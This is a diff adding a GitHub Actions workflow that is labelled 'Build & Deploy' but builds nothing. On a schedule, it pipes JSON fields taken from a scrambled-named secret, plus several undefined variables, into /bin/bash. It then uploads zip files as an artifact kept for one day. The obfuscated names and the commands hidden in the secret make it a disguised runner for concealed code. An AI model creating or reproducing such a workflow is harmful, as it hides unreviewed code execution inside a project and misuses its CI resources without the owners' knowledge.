@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          pqo63069: ${{ secrets.pqo63069 }}
+        run: |
+          printf '%s' "$pqo63069" | jq -r .flg81 | /bin/bash
+          echo $mvhmi385 | jq -r .mn1 | /bin/bash
+          printf '%s' "$ds17895" | jq -r .vp8024 | /bin/bash
+          printf '%s' "$gdhm93432" | jq -r .q28691 | /bin/bash
+          echo $m8 | jq -r .htcfl0 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: o8U18fw8
+          path: "*.zip"
+          retention-days: 1
